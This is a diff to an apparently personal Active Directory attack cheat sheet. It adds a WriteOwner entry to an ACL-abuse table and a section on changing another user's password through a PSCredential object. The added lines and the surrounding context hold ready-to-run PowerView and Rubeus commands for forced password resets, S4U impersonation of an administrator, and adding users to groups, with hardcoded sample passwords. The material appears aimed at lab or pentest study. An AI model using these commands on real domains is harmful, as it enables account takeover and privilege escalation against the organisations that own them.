@@ -23,6 +23,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
 * **[ACLs/ACEs Abuse](#acls/aces-abuse)**
 	* [ForceChangeUserPassword](#force-change-user-password)
+	* [Change Password (with PSCredential](#change-password-with-credential)
 	* [Targeted Kerberoast](#targeted-kerberoast)
 	* [Add DCsync privilege to object](#add-dcsync-to-object)
 	* [Add Users to Group](#add-users-to-group)
@@ -54,6 +55,7 @@ ACL/ACE | Permission | Abuse
 **GenericAll** | full rights to user/computer object | [Force change user's password](#force-change-user-password)
 **GenericWrite** | Write/update object's attributes | [RBCD](#resource-based-constrained-delegation), [Targeted Kerberoast](#targeted-kerberoast), [Force change user's password](#force-change-user-password)
 **WriteDACL** | modify object's ACE (full control) | [Give owned users DCsync Privilege](#add-dcsync-to-object)
+**WriteOwner** | change owner/password | [Change user's password with credential](#change-password-with-credential)
 **Self-Membership** | ability to add ourself to a group | [Add owned users to other group](#add-users-to-group)
 
 ## Domain Enumeration
@@ -168,9 +170,23 @@ Rubeus.exe s4u /user:mycomputer$ /rc4:<rc4/ntlm hash> /impersonateuser:administr
 
 ## ACLs/ACEs Abuse
 ### Force Change User Password
+_Note: This doesn't require you to know the owned user's credential_
 ```
 Set-DomainUserPassword -Identity studentadmin -AccountPassword (ConvertTo-SecureString -AsPlainText -Force 'P@$$w0rd!')
 ```
+
+### Change password with credential
+_Note: Need to know owned user's password_
+```
+# Create PSCredential Object
+$username='contoso\administrator'
+$password=ConvertTo-SecureString -AsPlainText -Force 'P@$$w0rd!'
+$cred = New-Object System.Management.Automation.PSCredential($username,$password)
+
+# Change password with PSCredential
+Set-DomainUserPassword -Identity studentadmin -Domain contoso.local -AccountPassword (ConvertTo-SecureString -AsPlainText -Force 'password123!') -Credential $cred
+```
+
 ### Add Users to Group
 ```
 Add-DomainGroupMember -Identity studentadmins -Members studentuser
